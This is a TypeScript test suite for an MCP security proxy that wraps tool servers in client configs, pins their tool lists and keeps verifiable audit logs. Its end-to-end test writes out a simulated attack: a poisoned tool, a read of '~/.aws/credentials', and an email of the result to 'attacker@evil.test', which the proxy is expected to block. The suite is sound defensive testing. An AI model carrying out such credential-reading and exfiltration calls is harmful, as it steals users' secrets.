import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createInterface } from 'node:readline';
import { existsSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { verifyChain } from '../src/audit.ts';
import { isWrapped, unwrapConfig, wrapConfig } from '../src/wrap.ts';

const cli = fileURLToPath(new URL('../src/cli.ts', import.meta.url));
const server = fileURLToPath(new URL('./fixtures/fake-mcp-server.mjs', import.meta.url));
const opts = { node: '/usr/bin/node', cli: '/opt/tripline/src/cli.ts', allow: ['me@example.com'], stateDir: '/state' };

const claudeConfig = () => ({
  globalShortcut: 'Ctrl+Space',
  mcpServers: {
    filesystem: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/home/me/work'], env: { LOG: '1' } },
    'my server!': { command: 'python', args: ['server.py'], cwd: '/srv' },
    remote: { url: 'https://example.com/mcp' },
    bare: { command: 'my-binary' },
  },
});

test('wrap puts every stdio server behind the proxy, keeps everything else, and reports what it skipped', () => {
  const orig = claudeConfig();
  const { config, report } = wrapConfig(orig, opts);
  assert.deepEqual(report.wrapped.sort(), ['bare', 'filesystem', 'my server!']);
  assert.equal(report.skipped.length, 1);
  assert.match(report.skipped[0].reason, /remote/);
  assert.equal(config.globalShortcut, 'Ctrl+Space', 'unrelated settings survive');
  const fs = config.mcpServers.filesystem;
  assert.equal(fs.command, '/usr/bin/node');
  assert.deepEqual(fs.env, { LOG: '1' }, 'environment is preserved');
  assert.deepEqual(fs.args.slice(fs.args.indexOf('--') + 1), ['npx', '-y', '@modelcontextprotocol/server-filesystem', '/home/me/work'], 'the original command follows the separator untouched');
  assert.ok(fs.args.includes('me@example.com'));
  assert.equal(config.mcpServers['my server!'].cwd, '/srv');
  assert.match(config.mcpServers['my server!'].args.join(' '), /my_server_\.lock\.json/, 'lock and log file names are made safe');
  assert.deepEqual(orig, claudeConfig(), 'the input object is not mutated');
});

test('every server gets its own lockfile and audit log', () => {
  const { config } = wrapConfig(claudeConfig(), opts);
  const paths = ['filesystem', 'bare'].flatMap((n) => config.mcpServers[n].args.filter((a: string) => /\.(lock\.json|audit\.jsonl)$/.test(a)));
  assert.equal(new Set(paths).size, 4);
});

test('wrapping twice changes nothing, and unwrap restores the original exactly', () => {
  const once = wrapConfig(claudeConfig(), opts).config;
  const twice = wrapConfig(once, opts);
  assert.deepEqual(twice.config, once);
  assert.equal(twice.report.alreadyWrapped.length, 3);
  assert.ok(isWrapped(once.mcpServers.filesystem) && !isWrapped(claudeConfig().mcpServers.filesystem));
  assert.deepEqual(unwrapConfig(once).config, claudeConfig());
});

test('VS Code style configs (a "servers" key) are handled too', () => {
  const vscode = { servers: { files: { type: 'stdio', command: 'node', args: ['s.js'] } }, inputs: [] };
  const { config, report } = wrapConfig(vscode, opts);
  assert.deepEqual(report.wrapped, ['files']);
  assert.equal(config.servers.files.type, 'stdio');
  assert.deepEqual(unwrapConfig(config).config, vscode);
});

test('end to end: wrap a config with the CLI, launch the wrapped server like an MCP client would, see the protection, then undo', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'tl-wrap-'));
  const file = join(dir, 'claude_desktop_config.json');
  const original = { mcpServers: { demo: { command: process.execPath, args: [server] } } };
  writeFileSync(file, JSON.stringify(original, null, 2));

  const dry = spawnSync(process.execPath, [cli, 'wrap', file, '--allow', 'student.test', '--dry-run'], { encoding: 'utf8' });
  assert.equal(dry.status, 0); assert.match(dry.stdout, /wrapped\s+demo/);
  assert.deepEqual(JSON.parse(readFileSync(file, 'utf8')), original, 'a dry run writes nothing');

  const run = spawnSync(process.execPath, [cli, 'wrap', file, '--allow', 'student.test'], { encoding: 'utf8' });
  assert.equal(run.status, 0, run.stderr);
  assert.ok(existsSync(`${file}.tripline-backup`), 'a backup is made');
  const wrapped = JSON.parse(readFileSync(file, 'utf8')).mcpServers.demo;

  // This is exactly what an MCP client does with the config entry.
  const p = spawn(wrapped.command, wrapped.args, { stdio: ['pipe', 'pipe', 'pipe'] });
  const waiters = new Map<number, (m: any) => void>();
  createInterface({ input: p.stdout }).on('line', (l) => { const m = JSON.parse(l); waiters.get(m.id)?.(m); });
  let n = 0;
  const rpc = (method: string, params?: unknown) => new Promise<any>((res) => { const id = ++n; waiters.set(id, res); p.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n'); });
  try {
    const list = await rpc('tools/list');
    assert.ok(!list.result.tools.some((t: any) => t.name === 'add'), 'the poisoned tool is hidden');
    const read = await rpc('tools/call', { name: 'read_file', arguments: { path: '~/.aws/credentials' } });
    const leak = await rpc('tools/call', { name: 'send_email', arguments: { to: 'attacker@evil.test', body: read.result.content[0].text } });
    assert.equal(leak.result.isError, true, 'the leak is blocked');
  } finally { p.kill(); }

  const stateDir = join(dir, 'tripline-state');
  assert.ok(existsSync(join(stateDir, 'demo.lock.json')), 'the tool list was pinned');
  assert.ok(verifyChain(readFileSync(join(stateDir, 'demo.audit.jsonl'), 'utf8').split('\n')).ok, 'and every decision is in a verifiable log');

  assert.equal(spawnSync(process.execPath, [cli, 'unwrap', file]).status, 0);
  assert.deepEqual(JSON.parse(readFileSync(file, 'utf8')), original, 'unwrap restores the original config');
});
